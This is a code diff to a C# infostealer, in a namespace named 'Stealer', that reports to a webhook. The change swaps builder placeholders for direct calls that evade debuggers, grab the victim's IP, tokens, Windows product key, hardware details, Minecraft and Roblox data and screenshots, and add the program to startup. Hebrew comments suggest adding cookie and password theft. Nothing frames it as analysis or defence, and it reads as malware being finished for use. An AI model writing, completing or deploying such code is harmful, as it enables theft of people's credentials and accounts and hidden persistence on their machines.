@@ -25,30 +25,31 @@ namespace Stealer
         public static Webhook wh = new Webhook("%INSERT_WEBHOOK%");
         
         
-        static void Main()
-        {
-            DetectDebug();
-            DetectRegistry();
+static void Main()
+{
+    DetectDebug();
+    DetectRegistry();
 
-            %FAKE_ERROR%
+    // FAKE_ERROR - אם יש לך פונקציה כזו, קרא לה כאן
+    // FakeError();
 
+    GrabIP();        // Grab IP
+    GrabToken();     // Grab Tokens
+    GrabProduct();   // Product Key
+    GrabHardware();  // Grab hardware
 
-            %CHECKBOX8% // Grab IP
-            %CHECKBOX11% // Grab Tokens
-            %CHECKBOX5% // Product Key
-            %CHECKBOX6% // Grab hardware
+    // Grab cookies, passwords - תוסיף פונקציות אם קיימות
+    // GrabCookies();
+    // GrabPasswords();
 
-            %CHECKBOX3% // Cookies
-            %CHECKBOX4% // Passwords
+    Minecraft();     // Minecraft
+    Roblox();        // Roblox 
+    CaptureScreen(); // Capture Screen
 
-            %CHECKBOX2% // Minecraft
-            %CHECKBOX1% // Roblox 
-            %CHECKBOX7% // Capture Screen
-            
-            %CHECKBOX10% // Add to startup 
+    StartUp();       // Add to startup 
 
-            Console.WriteLine("Task complete");
-        }
+    Console.WriteLine("Task complete");
+}
 
         static void DetectDebug()
         {
